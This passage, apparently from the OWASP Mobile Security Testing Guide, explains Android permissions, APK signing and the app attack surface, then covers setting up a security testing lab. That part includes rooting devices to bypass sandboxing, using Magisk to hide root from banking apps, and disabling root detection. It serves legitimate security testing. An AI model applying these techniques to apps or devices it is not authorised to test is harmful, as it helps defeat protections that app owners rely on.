\OtherTok{    package=}\StringTok{"com.permissions.sample"} \ErrorTok{...}\KeywordTok{>}

    \KeywordTok{<uses{-}permission}\OtherTok{ android:name=}\StringTok{"android.permission.RECEIVE\_SMS"} \KeywordTok{/>}
    \KeywordTok{<application>}\NormalTok{...}\KeywordTok{</application>}
\KeywordTok{</manifest>}
\end{Highlighting}
\end{Shaded}

Declaring Permissions

Apps can expose features and content to other apps installed on the
system. To restrict access to its own components, it can either use any
of Android's
\href{https://developer.android.com/reference/android/Manifest.permission.html}{predefined
permissions} or define its own. A new permission is declared with
the~\texttt{\textless{}permission\textgreater{}} element. The example
below shows an app declaring a permission:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<manifest}\OtherTok{ xmlns:android=}\StringTok{"http://schemas.android.com/apk/res/android"}
\OtherTok{    package=}\StringTok{"com.permissions.sample"} \ErrorTok{...}\KeywordTok{>}

    \KeywordTok{<permission}
\OtherTok{    android:name=}\StringTok{"com.permissions.sample.ACCESS\_USER\_INFO"}
\OtherTok{    android:protectionLevel=}\StringTok{"signature"} \KeywordTok{/>}
    \KeywordTok{<application>}\NormalTok{...}\KeywordTok{</application>}
\KeywordTok{</manifest>}
\end{Highlighting}
\end{Shaded}

The above code defines a new permission named
\texttt{com.permissions.sample.ACCESS\_USER\_INFO} with the protection
level \texttt{Signature}. Any components protected with this permission
would be accessible only by apps signed with the same developer
certificate.

Enforcing Permissions on Android Components

Android components can be protected with permissions. Activities,
Services, content providers, and Broadcast Receivers---all can use the
permission mechanism to protect their interfaces. Permissions can be
enforced on \emph{Activities}, \emph{Services}, and \emph{Broadcast
Receivers} by adding the attribute \emph{android:permission} to the
respective component tag in AndroidManifest.xml:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<receiver}
\OtherTok{    android:name=}\StringTok{"com.permissions.sample.AnalyticsReceiver"}
\OtherTok{    android:enabled=}\StringTok{"true"}
\OtherTok{    android:permission=}\StringTok{"com.permissions.sample.ACCESS\_USER\_INFO"}\KeywordTok{>}
\NormalTok{    ...}
\KeywordTok{</receiver>}
\end{Highlighting}
\end{Shaded}

\emph{Content providers} are a little different. They support a separate
set of permissions for reading, writing, and accessing the content
provider with a content URI.

\begin{itemize}
\tightlist
\item
  \texttt{android:writePermission}, \texttt{android:readPermission}: the
  developer can set separate permissions for reading or writing.
\item
  \texttt{android:permission}: general permission that will control
  reading and writing to the content provider.
\item
  \texttt{android:grantUriPermissions}: \texttt{"true"} if the content
  provider can be accessed with a content URI (the access temporarily
  bypasses the restrictions of other permissions), and \texttt{"false"}
  otherwise.
\end{itemize}

\hypertarget{signing-and-publishing-process}{%
\subsubsection{Signing and Publishing
Process}\label{signing-and-publishing-process}}

Once an app has been successfully developed, the next step is to publish
and share it with others. However, apps can't simply be added to a store
and shared, for several reasons---they must be signed. The cryptographic
signature serves as a verifiable mark placed by the developer of the
app. It identifies the app's author and ensures that the app has not
been modified since its initial distribution.

\hypertarget{signing-process}{%
\paragraph{Signing Process}\label{signing-process}}

During development, apps are signed with an automatically generated
certificate. This certificate is inherently insecure and is for
debugging only. Most stores don't accept this kind of certificate for
publishing; therefore, a certificate with more secure features must be
created. When an application is installed on the Android device, the
Package Manager ensures that it has been signed with the certificate
included in the corresponding APK. If the certificate's public key
matches the key used to sign any other APK on the device, the new APK
may share a UID with the pre-existing APK. This facilitates interactions
between applications from a single vendor. Alternatively, specifying
security permissions for the Signature protection level is possible;
this will restrict access to applications that have been signed with the
same key.

\hypertarget{apk-signing-schemes}{%
\paragraph{APK Signing Schemes}\label{apk-signing-schemes}}

Android supports three application signing schemes. Starting with
Android 9 (API level 28), APKs can be verified with APK Signature Scheme
v3 (v3 scheme), APK Signature Scheme v2 (v2 scheme) or JAR signing (v1
scheme). For Android 7.0 (API level 24) and above, APKs can be verified
with the APK Signature Scheme v2 (v2 scheme) or JAR signing (v1 scheme).
For backwards compatibility, an APK can be signed with multiple
signature schemes in order to make the app run on both newer and older
SDK versions.
\href{https://source.android.com/security/apksigning/}{Older platforms
ignore v2 signatures and verify v1 signatures only}.

\hypertarget{jar-signing-v1-scheme}{%
\subparagraph{JAR Signing (v1 Scheme)}\label{jar-signing-v1-scheme}}

The original version of app signing implements the signed APK as a
standard signed JAR, which must contain all the entries in
\texttt{META-INF/MANIFEST.MF}. All files must be signed with a common
certificate. This scheme does not protect some parts of the APK, such as
ZIP metadata. The drawback of this scheme is that the APK verifier needs
to process untrusted data structures before applying the signature, and
the verifier discards data the data structures don't cover. Also, the
APK verifier must decompress all compressed files, which takes
considerable time and memory.

\hypertarget{apk-signature-scheme-v2-scheme}{%
\subparagraph{APK Signature Scheme (v2
Scheme)}\label{apk-signature-scheme-v2-scheme}}

With the APK signature scheme, the complete APK is hashed and signed,
and an APK Signing Block is created and inserted into the APK. During
validation, the v2 scheme checks the signatures of the entire APK file.
This form of APK verification is faster and offers more comprehensive
protection against modification. You can see the
\href{https://source.android.com/security/apksigning/v2\#verification}{APK
signature verification process for v2 Scheme} below.

\begin{figure}
\centering
\includegraphics[width=4.6875in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/b49fc3618488c3a40ee2d09e488dd0d40ac9502f.png}
\caption{Android Software Stack}
\end{figure}

\hypertarget{apk-signature-scheme-v3-scheme}{%
\paragraph{APK Signature Scheme (v3
Scheme)}\label{apk-signature-scheme-v3-scheme}}

The v3 APK Signing Block format is the same as v2. V3 adds information
about the supported SDK versions and a proof-of-rotation struct to the
APK signing block. In Android 9 (API level 28) and higher, APKs can be
verified according to APK Signature Scheme v3, v2 or v1 scheme. Older
platforms ignore v3 signatures and try to verify v2 then v1 signature.

The proof-of-rotation attribute in the signed-data of the signing block
consists of a singly-linked list, with each node containing a signing
certificate used to sign previous versions of the app. To make backward
compatibility work, the old signing certificates sign the new set of
certificates, thus providing each new key with evidence that it should
be as trusted as the older key(s). It is no longer possible to sign APKs
independently, because the proof-of-rotation structure must have the old
signing certificates signing the new set of certificates, rather than
signing them one-by-one. You can see the
\href{https://source.android.com/security/apksigning/v3}{APK signature
v3 scheme verification process} below.

\begin{figure}
\centering
\includegraphics[width=4.6875in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/6c3c805441548d38b63caf39920079fd1673c545.png}
\caption{apk-validation-process-v3-scheme}
\end{figure}

\hypertarget{creating-your-certificate}{%
\subparagraph{Creating Your
Certificate}\label{creating-your-certificate}}

Android uses public/private certificates to sign Android apps (.apk
files). Certificates are bundles of information; in terms of security,
keys are the most important type of this information Public certificates
contain users' public keys, and private certificates contain users'
private keys. Public and private certificates are linked. Certificates
are unique and can't be re-generated. Note that if a certificate is
lost, it cannot be recovered, so updating any apps signed with that
certificate becomes impossible. App creators can either reuse an
existing private/public key pair that is in an available KeyStore or
generate a new pair. In the Android SDK, a new key pair is generated
with the \texttt{keytool} command. The following command creates a RSA
key pair with a key length of 2048 bits and an expiry time of 7300 days
= 20 years. The generated key pair is stored in the file
`myKeyStore.jks', which is in the current directory):

\begin{verbatim}
$ keytool -genkey -alias myDomain -keyalg RSA -keysize 2048 -validity 7300 -keystore myKeyStore.jks -storepass myStrongPassword
\end{verbatim}

Safely storing your secret key and making sure it remains secret during
its entire life cycle is of paramount importance. Anyone who gains
access to the key will be able to publish updates to your apps with
content that you don't control (thereby adding insecure features or
accessing shared content with signature-based permissions). The trust
that a user places in an app and its developers is based totally on such
certificates; certificate protection and secure management are therefore
vital for reputation and customer retention, and secret keys must never
be shared with other individuals. Keys are stored in a binary file that
can be protected with a password; such files are referred to as
`KeyStores'. KeyStore passwords should be strong and known only to the
key creator. For this reason, keys are usually stored on a dedicated
build machine that developers have limited access to. An Android
certificate must have a validity period that's longer than that of the
associated app (including updated versions of the app). For example,
Google Play will require certificates to remain valid until Oct 22nd,
2033 at least.

\hypertarget{signing-an-application}{%
\subparagraph{Signing an Application}\label{signing-an-application}}

The goal of the signing process is to associate the app file (.apk) with
the developer's public key. To achieve this, the developer calculates a
hash of the APK file and encrypts it with their own private key. Third
parties can then verify the app's authenticity (e.g., the fact that the
app really comes from the user who claims to be the originator) by
decrypting the encrypted hash with the author's public key and verifying
that it matches the actual hash of the APK file.

Many Integrated Development Environments (IDE) integrate the app signing
process to make it easier for the user. Be aware that some IDEs store
private keys in clear text in configuration files; double-check this in
case others are able to access such files and remove the information if
necessary. Apps can be signed from the command line with the `apksigner'
tool provided by the Android SDK (API level 24 and higher). It is
located at \texttt{{[}SDK-Path{]}/build-tools/{[}version{]}}. For API
24.0.2 and below, you can use `jarsigner', which is part of the Java
JDK. Details about the whole process can be found in official Android
documentation; however, an example is given below to illustrate the
point.

\begin{verbatim}
$ apksigner sign --out mySignedApp.apk --ks myKeyStore.jks myUnsignedApp.apk
\end{verbatim}

In this example, an unsigned app (`myUnsignedApp.apk') will be signed
with a private key from the developer KeyStore `myKeyStore.jks' (located
in the current directory). The app will become a signed app called
`mySignedApp.apk' and will be ready to release to stores.

Zipalign

The \texttt{zipalign} tool should always be used to align the APK file
before distribution. This tool aligns all uncompressed data (such as
images, raw files, and 4-byte boundaries) within the APK that helps
improve memory management during app runtime.

\begin{quote}
Zipalign must be used before the APK file is signed with apksigner.
\end{quote}

\hypertarget{publishing-process}{%
\paragraph{Publishing Process}\label{publishing-process}}

Distributing apps from anywhere (your own site, any store, etc.) is
possible because the Android ecosystem is open. However, Google Play is
the most well-known, trusted, and popular store, and Google itself
provides it. Amazon Appstore is the trusted default store for Kindle
devices. If users want to install third-party apps from a non-trusted
source, they must explicitly allow this with their device security
settings.

Apps can be installed on an Android device from a variety of sources:
locally via USB, via Google's official app store (Google Play Store) or
from alternative stores.

Whereas other vendors may review and approve apps before they are
actually published, Google will simply scan for known malware
signatures; this minimizes the time between the beginning of the
publishing process and public app availability.

Publishing an app is quite straightforward; the main operation is making
the signed APK file downloadable. On Google Play, publishing starts with
account creation and is followed by app delivery through a dedicated
interface. Details are available at
\href{https://developer.android.com/distribute/googleplay/start.html}{the
official Android documentation}.

\hypertarget{android-application-attack-surface}{%
\subsubsection{Android Application Attack
surface}\label{android-application-attack-surface}}

The Android application attack surface consists of all components of the
application, including the supportive material necessary to release the
app and to support its functioning. The Android application may be
vulnerable to attack if it does not:

\begin{itemize}
\tightlist
\item
  Validate all input by means of IPC communication or URL schemes, see
  also:

  \begin{itemize}
  \tightlist
  \item
    \href{0x05h-Testing-Platform-Interaction.md\#testing-for-sensitive-functionality-exposure-through-ipc-mstg-platform-4}{Testing
    for Sensitive Functionality Exposure Through IPC}
  \item
    \href{0x05h-Testing-Platform-Interaction.md\#testing-custom-url-schemes-mstg-platform-3}{Testing
    Custom URL Schemes}
  \end{itemize}
\item
  Validate all input by the user in input fields.
\item
  Validate the content loaded inside a WebView, see also:

  \begin{itemize}
  \tightlist
  \item
    \href{0x05h-Testing-Platform-Interaction.md\#testing-javascript-execution-in-webviews-mstg-platform-5}{Testing
    JavaScript Execution in WebViews}
  \item
    \href{0x05h-Testing-Platform-Interaction.md\#testing-webview-protocol-handlers-mstg-platform-6}{Testing
    WebView Protocol Handlers}
  \item
    \href{0x05h-Testing-Platform-Interaction.md\#determining-whether-java-objects-are-exposed-through-webviews-mstg-platform-7}{Determining
    Whether Java Objects Are Exposed Through WebViews}
  \end{itemize}
\item
  Securely communicate with backend servers or is susceptible to
  man-in-the-middle attacks between the server and the mobile
  application, see also:

  \begin{itemize}
  \tightlist
  \item
    \href{0x04f-Testing-Network-Communication.md\#testing-network-communication}{Testing
    Network Communication}
  \item
    \href{0x05g-Testing-Network-Communication.md\#android-network-apis}{Android
    Network APIs}
  \end{itemize}
\item
  Securely stores all local data, or loads untrusted data from storage,
  see also:

  \begin{itemize}
  \tightlist
  \item
    \href{0x05d-Testing-Data-Storage.md\#data-storage-on-android}{Data
    Storage on Android}
  \end{itemize}
\item
  Protect itself against compromised environments, repackaging or other
  local attacks, see also:

  \begin{itemize}
  \tightlist
  \item
    \href{0x05j-Testing-Resiliency-Against-Reverse-Engineering.md\#android-anti-reversing-defenses}{Android
    Anti-Reversing Defenses}
  \end{itemize}
\end{itemize}

\hypertarget{android-basic-security-testing}{%
\subsection{Android Basic Security
Testing}\label{android-basic-security-testing}}

\hypertarget{basic-android-testing-setup}{%
\subsubsection{Basic Android Testing
Setup}\label{basic-android-testing-setup}}

By now, you should have a basic understanding of the way Android apps
are structured and deployed. In this chapter, we'll talk about setting
up a security testing environment and describe basic testing processes
you'll be using. This chapter is the foundation for the more detailed
testing methods discussed in later chapters.

You can set up a fully functioning test environment on almost any
machine running Windows, Linux, or Mac OS.

\hypertarget{host-device}{%
\paragraph{Host Device}\label{host-device}}

At the very least, you'll need
\href{https://developer.android.com/studio/index.html}{Android Studio}
(which comes with the Android SDK) platform tools, an emulator, and an
app to manage the various SDK versions and framework components. Android
Studio also comes with an Android Virtual Device (AVD) Manager
application for creating emulator images. Make sure that the newest
\href{https://developer.android.com/studio/index.html\#downloads}{SDK
tools} and
\href{https://developer.android.com/studio/releases/platform-tools.html}{platform
tools} packages are installed on your system.

In addition, you may want to complete your host setup by installing the
\href{https://developer.android.com/ndk}{Android NDK} if you're planing
to work with apps containing native libraries (it will be also relevant
in the chapter
``\href{0x05c-Reverse-Engineering-and-Tampering.md}{Tampering and
Reverse Engineering on Android}'').

\hypertarget{setting-up-the-android-sdk}{%
\subparagraph{Setting up the Android
SDK}\label{setting-up-the-android-sdk}}

Local Android SDK installations are managed via Android Studio. Create
an empty project in Android Studio and select \textbf{Tools}
-\textgreater{} \textbf{SDK Manager} to open the SDK Manager GUI. The
\textbf{SDK Platforms} tab is where you install SDKs for multiple API
levels. Recent API levels are:

\begin{itemize}
\tightlist
\item
  Android 10.0 (API level 29)
\item
  Android 9.0 (API level 28)
\item
  Android 8.1 (API level 27)
\item
  Android 8.0 (API level 26)
\end{itemize}

An overview of all Android codenames, their version number and API
levels can be found in the
\href{https://source.android.com/setup/start/build-numbers}{Android
Developer Documentation}.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/a92a527830c8d387b73bc3f82eb4c78e331d24dd.jpg}
\caption{SDK Manager}
\end{figure}

Installed SDKs are on the following paths:

Windows:

\begin{verbatim}
C:\Users\<username>\AppData\Local\Android\sdk
\end{verbatim}

MacOS:

\begin{verbatim}
/Users/<username>/Library/Android/sdk
\end{verbatim}

Note: On Linux, you need to choose an SDK directory. \texttt{/opt},
\texttt{/srv}, and \texttt{/usr/local} are common choices.

\hypertarget{setting-up-the-android-ndk}{%
\subparagraph{Setting up the Android
NDK}\label{setting-up-the-android-ndk}}

The Android NDK contains prebuilt versions of the native compiler and
toolchain. Both the GCC and Clang compilers have traditionally been
supported, but active support for GCC ended with NDK revision 14. The
device architecture and host OS determine the appropriate version. The
prebuilt toolchains are in the \texttt{toolchains} directory of the NDK,
which contains one subdirectory for each architecture.

\begin{longtable}[]{@{}ll@{}}
\toprule
Architecture & Toolchain name\tabularnewline
\midrule
\endhead
ARM-based &
arm-linux-androideabi-\textless gcc-version\textgreater{}\tabularnewline
x86-based & x86-\textless gcc-version\textgreater{}\tabularnewline
MIPS-based &
mipsel-linux-android-\textless gcc-version\textgreater{}\tabularnewline
ARM64-based &
aarch64-linux-android-\textless gcc-version\textgreater{}\tabularnewline
X86-64-based &
x86\_64-\textless gcc-version\textgreater{}\tabularnewline
MIPS64-based &
mips64el-linux-android-\textless gcc-version\textgreater{}\tabularnewline
\bottomrule
\end{longtable}

Besides picking the right architecture, you need to specify the correct
sysroot for the native API level you want to target. The sysroot is a
directory that contains the system headers and libraries for your
target. Native APIs vary by Android API level. Possible sysroots for
each Android API level are in \texttt{\$NDK/platforms/}. Each API level
directory contains subdirectories for the various CPUs and
architectures.

One possibility for setting up the build system is exporting the
compiler path and necessary flags as environment variables. To make
things easier, however, the NDK allows you to create a so-called
standalone toolchain---a ``temporary'' toolchain that incorporates the
required settings.

To set up a standalone toolchain, download the
\href{https://developer.android.com/ndk/downloads/index.html\#stable-downloads}{latest
stable version of the NDK}. Extract the ZIP file, change into the NDK
root directory, and run the following command:

\begin{verbatim}
$ ./build/tools/make_standalone_toolchain.py --arch arm --api 24 --install-dir /tmp/android-7-toolchain
\end{verbatim}

This creates a standalone toolchain for Android 7.0 (API level 24) in
the directory \texttt{/tmp/android-7-toolchain}. For convenience, you
can export an environment variable that points to your toolchain
directory, (we'll be using this in the examples). Run the following
command or add it to your \texttt{.bash\_profile} or other startup
script:

\begin{verbatim}
$  export TOOLCHAIN=/tmp/android-7-toolchain
\end{verbatim}

\hypertarget{testing-device}{%
\paragraph{Testing Device}\label{testing-device}}

For dynamic analysis, you'll need an Android device to run the target
app on. In principle, you can test without a real Android device and use
only the emulator. However, apps execute quite slowly on a emulator, and
simulators may not give realistic results. Testing on a real device
makes for a smoother process and a more realistic environment. On the
other hand, emulators allow you to easily change SDK versions or create
multiple devices. A full overview of the pros and cons of each approach
is listed in the table below.

\begin{longtable}[]{@{}lll@{}}
\toprule
\begin{minipage}[b]{0.30\columnwidth}\raggedright
Property\strut
\end{minipage} & \begin{minipage}[b]{0.30\columnwidth}\raggedright
Physical\strut
\end{minipage} & \begin{minipage}[b]{0.30\columnwidth}\raggedright
Emulator/Simulator\strut
\end{minipage}\tabularnewline
\midrule
\endhead
\begin{minipage}[t]{0.30\columnwidth}\raggedright
Ability to restore\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Softbricks are always possible, but new firmware can typically still be
flashed. Hardbricks are very rare.\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Emulators can crash or become corrupt, but a new one can be created or a
snapshot can be restored.\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.30\columnwidth}\raggedright
Reset\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Can be restored to factory settings or reflashed.\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Emulators can be deleted and recreated.\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.30\columnwidth}\raggedright
Snapshots\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Not possible.\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Supported, great for malware analysis.\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.30\columnwidth}\raggedright
Speed\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Much faster than emulators.\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Typically slow, but improvements are being made.\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.30\columnwidth}\raggedright
Cost\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Typically start at \$200 for a usable device. You may require different
devices, such as one with or without a biometric sensor.\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Both free and commercial solutions exist.\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.30\columnwidth}\raggedright
Ease of rooting\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Highly dependent on the device.\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Typically rooted by default.\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.30\columnwidth}\raggedright
Ease of emulator detection\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
It's not an emulator, so emulator checks are not applicable.\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Many artefacts will exist, making it easy to detect that the app is
running in an emulator.\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.30\columnwidth}\raggedright
Ease of root detection\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Easier to hide root, as many root detection algorithms check for
emulator properties. With Magisk Systemless root it's nearly impossible
to detect.\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Emulators will almost always trigger root detection algorithms due to
the fact that they are built for testing with many artefacts that can be
found.\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.30\columnwidth}\raggedright
Hardware interaction\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Easy interaction through Bluetooth, NFC, 4G, Wi-Fi, biometrics, camera,
GPS, gyroscope, \ldots{}\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Usually fairly limited, with emulated hardware input (e.g.~random GPS
coordinates)\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.30\columnwidth}\raggedright
API level support\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Depends on the device and the community. Active communities will keep
distributing updated versions (e.g.~LineageOS), while less popular
devices may only receive a few updates. Switching between versions
requires flashing the device, a tedious process.\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Always supports the latest versions, including beta releases. Emulators
containing specific API levels can easily be downloaded and
launched.\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.30\columnwidth}\raggedright
Native library support\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Native libraries are usually built for ARM devices, so they will work on
a physical device.\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Some emulators run on x86 CPUs, so they may not be able to run packaged
native libraries.\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.30\columnwidth}\raggedright
Malware danger\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Malware samples can infect a device, but if you can clear out the device
storage and flash a clean firmware, thereby restoring it to factory
settings, this should not be a problem. Be aware that there are malware
samples that try to exploit the USB bridge.\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Malware samples can infect an emulator, but the emulator can simply be
removed and recreated. It is also possible to create snapshots and
compare different snapshots to help in malware analysis. Be aware that
there are malware proofs of concept which try to attack the
hypervisor.\strut
\end{minipage}\tabularnewline
\bottomrule
\end{longtable}

\hypertarget{testing-on-a-real-device}{%
\subparagraph{Testing on a Real Device}\label{testing-on-a-real-device}}

Almost any physical device can be used for testing, but there are a few
considerations to be made. First, the device needs to be rootable. This
is typically either done through an exploit, or through an unlocked
bootloader. Exploits are not always available, and the bootloader may be
locked permanently, or it may only be unlocked once the carrier contract
has been terminated.

The best candidates are flagship Google pixel devices built for
developers. These devices typically come with an unlockable bootloader,
opensource firmware, kernel, radio available online and official OS
source code. The developer communities prefer Google devices as the OS
is closest to the android open source project. These devices generally
have the longest support windows with 2 years of OS updates and 1 year
of security updates after that.

Alternatively, Google's \href{https://www.android.com/one/}{Android One}
project contains devices that will receive the same support windows (2
years of OS updates, 1 year of security updates) and have near-stock
experiences. While it was originally started as a project for low-end
devices, the program has evolved to include mid-range and high-end
smartphones, many of which are actively supported by the modding
community.

Devices that are supported by the
\href{https://lineageos.org/}{LineageOS} project are also very good
candidates for test devices. They have an active community, easy to
follow flashing and rooting instructions and the latest Android versions
are typically quickly available as a Lineage installation. LineageOS
also continues support for new Android versions long after the OEM has
stopped distributing updates.

When working with an Android physical device, you'll want to enable
Developer Mode and USB debugging on the device in order to use the ADB
debugging interface. Since Android 4.2 (API level 16), the
\textbf{Developer options} sub menu in the Settings app is hidden by
default. To activate it, tap the \textbf{Build number} section of the
\textbf{About phone} view seven times. Note that the build number
field's location varies slightly by device---for example, on LG Phones,
it is under \textbf{About phone} -\textgreater{} \textbf{Software
information}. Once you have done this, \textbf{Developer options} will
be shown at bottom of the Settings menu. Once developer options are
activated, you can enable debugging with the \textbf{USB debugging}
switch.

\hypertarget{testing-on-an-emulator}{%
\subparagraph{Testing on an Emulator}\label{testing-on-an-emulator}}

Multiple emulators exist, once again with their own strengths and
weaknesses:

Free emulators:

\begin{itemize}
\tightlist
\item
  \href{https://developer.android.com/studio/run/managing-avds.html}{Android
  Virtual Device (AVD)} - The official android emulator, distributed
  with Android Studio.
\item
  \href{https://www.android-x86.org/}{Android X86} - An x86 port of the
  Android code base
\end{itemize}

Commercial emulators:

\begin{itemize}
\tightlist
\item
  \href{https://www.genymotion.com/fun-zone/}{Genymotion} - Mature
  emulator with many features, both as local and cloud-based solution.
  Free version available for non-commercial use.
\item
  \href{https://corellium.com/}{Corellium} - Offers custom device
  virtualization through a cloud-based or on-prem solution.
\end{itemize}

Although there exist several free Android emulators, we recommend using
AVD as it provides enhanced features appropriate for testing your app
compared to the others. In the remainder of this guide, we will use the
official AVD to perform tests.

AVD supports some hardware emulation, such as
\href{https://developer.android.com/studio/run/emulator-commandline.html\#geo}{GPS},
\href{https://developer.android.com/studio/run/emulator-commandline.html\#sms}{SMS}
and
\href{https://developer.android.com/guide/topics/sensors/sensors_overview\#test-with-the-android-emulator}{motion
sensors}.

You can either start an Android Virtual Device (AVD) by using the AVD
Manager in Android Studio or start the AVD manager from the command line
with the \texttt{android} command, which is found in the tools directory
of the Android SDK:

\begin{verbatim}
$ ./android avd
\end{verbatim}

Several tools and VMs that can be used to test an app within an emulator
environment are available:

\begin{itemize}
\tightlist
\item
  \href{https://github.com/MobSF/Mobile-Security-Framework-MobSF}{MobSF}
\item
  \href{https://github.com/mseclab/nathan}{Nathan} (not updated since
  2016)
\end{itemize}

Please also verify the ``\href{0x08-Testing-Tools.md}{Testing Tools}''
chapter at the end of this book.

\hypertarget{getting-privileged-access}{%
\subparagraph{Getting Privileged
Access}\label{getting-privileged-access}}

\emph{Rooting} (i.e., modifying the OS so that you can run commands as
the root user) is recommended for testing on a real device. This gives
you full control over the operating system and allows you to bypass
restrictions such as app sandboxing. These privileges in turn allow you
to use techniques like code injection and function hooking more easily.

Note that rooting is risky, and three main consequences need to be
clarified before you proceed. Rooting can have the following negative
effects:

\begin{itemize}
\tightlist
\item
  voiding the device warranty (always check the manufacturer's policy
  before taking any action)
\item
  ``bricking'' the device, i.e., rendering it inoperable and unusable
\item
  creating additional security risks (because built-in exploit
  mitigations are often removed)
\end{itemize}

You should not root a personal device that you store your private
information on. We recommend getting a cheap, dedicated test device
instead. Many older devices, such as Google's Nexus series, can run the
newest Android versions and are perfectly fine for testing.

\textbf{You need to understand that rooting your device is ultimately
YOUR decision and that OWASP shall in no way be held responsible for any
damage. If you're uncertain, seek expert advice before starting the
rooting process.}

Which Mobiles Can Be Rooted

Virtually any Android mobile can be rooted. Commercial versions of
Android OS (which are Linux OS evolutions at the kernel level) are
optimized for the mobile world. Some features have been removed or
disabled for these versions, for example, non-privileged users' ability
to become the `root' user (who has elevated privileges). Rooting a phone
means allowing users to become the root user, e.g., adding a standard
Linux executable called \texttt{su}, which is used to change to another
user account.

To root a mobile device, first unlock its boot loader. The unlocking
procedure depends on the device manufacturer. However, for practical
reasons, rooting some mobile devices is more popular than rooting
others, particularly when it comes to security testing: devices created
by Google and manufactured by companies like Samsung, LG, and Motorola
are among the most popular, particularly because they are used by many
developers. The device warranty is not nullified when the boot loader is
unlocked and Google provides many tools to support the root itself. A
curated list of guides for rooting all major brand devices is posted on
the \href{https://www.xda-developers.com/root/}{XDA forums}.

Rooting with Magisk

Magisk (``Magic Mask'') is one way to root your Android device. It's
specialty lies in the way the modifications on the system are performed.
While other rooting tools alter the actual data on the system partition,
Magisk does not (which is called ``systemless''). This enables a way to
hide the modifications from root-sensitive applications (e.g.~for
banking or games) and allows using the official Android OTA upgrades
without the need to unroot the device beforehand.

You can get familiar with Magisk reading the official
\href{https://topjohnwu.github.io/Magisk/}{documentation on GitHub}. If
you don't have Magisk installed, you can find installation instructions
in \href{https://topjohnwu.github.io/Magisk/}{the documentation}. If you
use an official Android version and plan to upgrade it, Magisk provides
a \href{https://topjohnwu.github.io/Magisk/ota.html}{tutorial on
GitHub}.

Furthermore, developers can use the power of Magisk to create custom
modules and
\href{https://github.com/Magisk-Modules-Repo/submission}{submit} them to
the official \href{https://github.com/Magisk-Modules-Repo}{Magisk
Modules repository}. Submitted modules can then be installed inside the
Magisk Manager application. One of these installable modules is a
systemless version of the famous
\href{https://repo.xposed.info/module/de.robv.android.xposed.installer}{Xposed
Framework} (available for SDK versions up to 27).

Root Detection

An extensive list of root detection methods is presented in the
``Testing Anti-Reversing Defenses on Android'' chapter.

For a typical mobile app security build, you'll usually want to test a
debug build with root detection disabled. If such a build is not
available for testing, you can disable root detection in a variety of
ways that will be introduced later in this book.

\hypertarget{recommended-tools---android-device}{%
\paragraph{Recommended Tools - Android
device}\label{recommended-tools---android-device}}

There are many tools and frameworks used throughout this guide to assess
the security of Android applications. In the next sections, you will
learn more about some of the commands and interesting use cases. Please
check the official documentation for installation instructions of the
following tools/APKs:

\begin{itemize}
\tightlist
\item
  APK Extractor: App to extract APKs without root.
\item
  Frida server: Server for Frida, the dynamic instrumentation toolkit
  for developers, reverse-engineers, and security researchers. See
  \protect\hyperlink{frida}{Frida} section below for more information.
\item
  Drozer agent: Agent for drozer, the framework that allows you to
  search for security vulnerabilities in apps and devices. See
  \protect\hyperlink{drozer}{Drozer} section below for more information.
\item
  Busybox: Busybox combines multiple common Unix utilities into a small
  single executable. The utilities included generally have fewer options
  than their full-featured GNU counterparts, but are sufficient enough
  to provide a complete environment on a small or embedded system.
  Busybox can be installed on a rooted device by downloading the Busybox
  application from Google Play Store. You can also download the binary
  directly from the \href{https://busybox.net}{Busybox website}. Once
  downloaded, make an \texttt{adb\ push\ busybox\ /data/local/tmp} to
  have the executable available on your phone. A quick overview of how
  to install and use Busybox can be found in the
  \href{https://busybox.net/FAQ.html\#getting_started}{Busybox FAQ}.
\end{itemize}

\hypertarget{xposed}{%
\subparagraph{Xposed}\label{xposed}}

\href{http://repo.xposed.info/module/de.robv.android.xposed.installer}{Xposed}
is a ``framework for modules that can change the behavior of the system
